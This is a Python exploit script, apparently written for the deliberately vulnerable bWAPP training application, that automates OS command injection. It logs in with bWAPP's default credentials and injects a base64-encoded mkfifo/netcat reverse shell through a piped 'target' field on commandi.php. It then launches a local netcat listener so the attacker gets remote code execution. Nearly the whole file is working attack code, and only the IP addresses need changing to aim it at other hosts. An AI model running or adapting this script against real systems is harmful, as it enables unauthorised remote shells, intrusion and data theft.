#!/usr/bin/python3

import requests
import re
import sys
import base64
import subprocess
import shlex
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
	def __init__ (self):
		self.red = '\033[91m'
		self.green = '\033[92m'
		self.white = '\033[37m'
		self.yellow = '\033[93m'
		self.bold = '\033[1m'
		self.end = '\033[0m'

	def header(self):
		print('\n    >> bwapp - OS Command Injection')
		print('    >> by twseptian\n')

	def info (self, message):
		print(f"[{self.white}*{self.end}] {message}")

	def warning (self, message):
		print(f"[{self.yellow}!{self.end}] {message}")

	def error (self, message):
		print(f"[{self.red}x{self.end}] {message}")

	def success (self, message):
		print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} #proxy configuration
target_ip = '172.17.0.3' #change target ip
target_port = '80' #change target port
localhost = '172.17.0.1' #change localhost ip
localport = '4444' #change localport

def login_to_bwapp():
    #POST Data
    global session
    global cookies
    session = requests.Session()
    data = {"login": "bee", "password": "bug", "security_level": "1", "form": "submit"}
    try:
        output.info("URL: {}/login.php".format(target_ip))
        response = session.post('http://'+target_ip+':'+target_port+'/login.php', data=data, verify=False, proxies=proxies)
        output.success("Logged in Successfully")
        cookies = response.cookies.get_dict()
    except requests.HTTPError as exception:
        output.error("HTTP Error : {}".format(exception))
        sys.exit(1)

def command_injection():
    output.info("OS Command Injection")
    output.info("Information: {}:{}".format(localhost,localport))
    #encode with base64
    reverse_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+localhost+" "+localport+" >/tmp/f"
    encodedBytes = base64.b64encode(reverse_shell.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    
    payload = "www.nsa.gov | echo {} | base64 -d | bash".format(encodedStr) #run reverse shell
    input_payload = {"target": payload,"form": "submit"}
    output.warning("Command: {}".format(payload))
    listener = "nc -nvlp {}".format(localport)
    args = shlex.split(listener)
    subprocess.Popen(args)
    output.warning("Take RCE\n")
    input_ci = session.post('http://'+target_ip+':'+target_port+'/commandi.php', cookies=cookies, data=input_payload, proxies=proxies)

def main():
    # Login to bwapp
    login_to_bwapp()
    # Trigger Command Injection
    command_injection()

if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
      pass